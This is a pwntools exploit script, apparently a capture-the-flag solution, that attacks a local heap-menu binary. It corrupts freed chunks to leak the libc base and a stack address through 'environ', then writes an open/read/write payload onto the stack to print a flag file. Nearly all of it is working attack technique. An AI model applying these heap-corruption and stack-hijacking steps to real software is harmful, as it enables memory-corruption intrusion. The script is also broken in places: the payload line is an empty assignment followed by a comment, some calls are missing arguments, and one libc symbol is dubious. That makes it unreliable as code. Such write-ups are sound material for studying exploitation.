from pwn import *
context.log_level='debug'

sh = process('./pwn')
libc = ELF('./libc.so.6')

def add(idx,size,cont):
	sh.sendline('1')
	sh.sendline(str(size))
	sh.sendline(str(idx))
	sh.send(cont)
def dele(idx):
	sh.sendline('4')
	sh.sendline(str(idx))
def edit(idx,content):
	sh.sendline('2')
	sh.sendline(str(idx))
	sh.send(content)
def show(idx):
	sh.sendline('3')
	sh.sendline(str(idx))

sh.recvuntil('gift:')
libc_down = int(sh.recv(4),16)
fileno = libc_down  + libc.sym['stdout.fileno'] - libc.sym['printf']

for i in range(10):
	add(0,0x10,'aaaa\n')
	add(0,0x20,'aaaa\n')
	add(0,0x30,'aaaa\n')
	add(0,0x40,'aaaa\n')
	add(0,0x50,'aaaa\n')
	add(0,0x60,'aaaa\n')

add(0,0,'a\n')
for i in range(10):#1 - 10
	add(i+1,0x60)
add(11,0x10,p64(0)+p64(0x21)+b'\n')

edit(0,p64(0)*3+p64(0x461))

dele(3)
dele(2)
add(1,0x60,'aaaaaaaa\n')

edit(0,p64(0)*3+p64(0x71)+b'a'*0x60+p64(0)+p64(0x71)+ bytes( chr(fileno & 0xff).encode('utf-8') ) + bytes( chr((fileno>>8) & 0xff).encode('utf-8') ) + b'\n' )
add(2,0x60,p64(2)+b'\n')

add(12,0x40,'aaaaaaaa\n')
show(12)
libcbase = u64(sh.recv(6).ljust(8,b'\x00'))

#5
dele(5)
dele(1)
edit(0,p64(0)*3+p64(0x71)+p64(libcbase+libc.sym['environ']))
add(1,0x60,'aaaaaaaa\n')
add(13,0x60,'\n')
show(13)
stack = u64(sh.recv(6).ljust(8,b'\x00'))

payload = # read(0,buf1,16) read('./flag\x00') open(buf1,0,0) read(3,buf2,0x80) write(1,buf2,0x80)

dele(6)
dele(1)
edit(0,p64(0)*3+p64(0x71)+p64(stack))
add(1,0x60,'\n')
add(14,0x60,'\n')
edit(14,payload[0:0x60])

dele(7)
dele(1)
edit(0,p64(0)*3+p64(0x71)+p64(stack+0x60))
add(1,0x60,'\n')
add(15,0x60,'\n')
edit(15,payload[0x60:0x60*2])

dele(8)
dele(1)
edit(0,p64(0)*3+p64(0x71)+p64(stack+0x60*2))
add(1,0x60,'\n')
add(16,0x60,'\n')
edit(16,payload[0x60*2:])


log.success(hex(libcbase))
log.success(hex(stack))
sh.interactive()
